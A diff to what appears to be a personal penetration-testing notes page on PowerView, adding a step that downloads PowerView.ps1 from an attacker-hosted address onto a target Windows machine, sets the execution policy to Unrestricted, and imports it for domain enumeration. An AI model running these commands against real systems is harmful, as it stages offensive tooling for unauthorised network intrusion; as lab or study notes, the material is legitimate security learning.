@@ -8,6 +8,12 @@ public:: true
 - Source code available [here](https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1). *(GH repository archived on Jan 21, 2021)*
 - HackTricks docs [here](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview).
 - [SharpView](https://github.com/tevora-threat/SharpView) is a .NET port of PowerView. *(Last update was in 2018)*
+- Upload it to the target Windows machine
+	- ```powershell
+	  curl "http://192.168.45.218:8000/PowerView.ps1" -o "PowerView.ps1"
+	  Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
+	  Import-Module .\PowerView.ps1
+	  ```
 - Enumeration
 	- Log to the *target machine* as a domain user.
 	  #+BEGIN_NOTE
